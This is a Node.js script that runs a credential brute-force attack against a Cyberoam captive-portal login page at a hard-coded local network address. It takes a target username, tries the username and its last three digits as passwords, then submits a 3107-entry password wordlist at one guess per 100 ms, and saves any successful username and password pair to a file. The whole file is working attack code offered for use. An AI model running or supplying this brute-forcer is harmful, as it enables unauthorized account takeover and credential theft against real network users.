//node request module to make http requests
var request = require('request');

//node fs module to read from or write to file
var fs = require('fs');

//passwords array which will contain passwords from .txt file
var passwords = [];

//node xml2js module to parse xml response
//cyberoam (captive portal) sends xml response
var parseString = require('xml2js').parseString;

//username supplied by user as command line argument
var targetUsername = process.argv[2];

/**
* I am using passwords_jhon.txt for brute force attack which 
* contains 3107 passords 
* You can use other files e.g. pass500.txt (top 500 passwords)
*/
var lineReader = require('readline').createInterface({
	//change this line if using other passwords list
    input: fs.createReadStream('./passwords_jhon.txt')
});

lineReader.on('line', function(line) {
    passwords.push(line);
    //passwords_jhon.txt has 3107 passwords
    //start attack after all passwords has been filled in array
    if (passwords.length > 3106) {
    	bruteForce();
    }
});

//global variable to check if password has been guessed
//used to prevent further attack once password has been guessed
var cracked = false;

//function which will make http post request to login portal
var makeRequest = function(testCase) {
	console.log(testCase.params.username, testCase.params.password);
    request.post({
    	url: testCase.url,
    	body: testCase.body
    	//json: testCase.params
    }, function optionalcallback(error, response, body) {
    	console.log('testing: ' + testCase.params.username, 
    		    'using password: ' + testCase.params.password);
	    if (error) {
	        console.log('err', error);
	    } else {
	    	if (response && response.body) {
	    		parseString(response.body, function(error, result) {
	    			try {
			    			if (result.requestresponse.message[0] == 'You have successfully logged in') {
			    				console.log('Success: ' + testCase.params.username + ' ' +
			    					    testCase.params.password);
			    				var data = {};
			    				data.username = testCase.params.username;
			    				data.password = testCase.params.password;
				    		    writeToFile('cracked.txt', data);
				    		    cracked = true;
			    			}
			    		} catch(e) {
			    			console.log('Exception thrown');
			    		}
	    		});
	    	}
	    }
    });
};

//function to write username and corresponding guessed password in cracked.txt file
var writeToFile = function(fileName, data) {
	fs.appendFile(fileName, data.username + ': ' + data.password + '\n', function(err) {
		if (err) {
			console.log(err);
		}
	});
};

//method which will make one request in 100 milli seconds (1 different password per request)
var bruteForce = function() {
    var index = -1;
    //if username is password itself
    makeGuess(targetUsername, targetUsername);
    //make guess each 100ms
    var timer = setInterval(function() {
    	//stop attack when we have scanned all passwords from list
    	//or when password has been successfully guessed
    	if ((index == passwords.length) || (cracked == true)) {
    		clearInterval(timer);
    		if (cracked == true) {
    			console.log('Success! Check cracked.txt');
    		}
    	} else if (index == -1) {
    		//if password is last 3 digits of username
    		//will run only one time
    		makeGuess(targetUsername, targetUsername.substr(targetUsername.length - 3));
    		index++;
    	} else {
    		var progress = parseInt(index / passwords.length * 100) + '%';
    		console.log(progress);
    		makeGuess(targetUsername, passwords[index++]);
    	}
    }, 100);
};

var makeGuess = function(username, password) {
	var date = new Date();
	var body = 'mode=191&username=' + username + '&password=' + password + 
	        '&a=' + date.getTime() + '&producttype=0';
	var url = 'http://172.16.0.1:8090/login.xml';
	//test-server url for testing
	//var url = 'http://localhost:4000/login';
	var testCase = {
		url: url,
		method: 'post',
		params: {
			mode: '191',
			username: username,
			password: password,
			a: date.getTime(),
			producttype: '0'
		},
		body: body
	};
	makeRequest(testCase);
};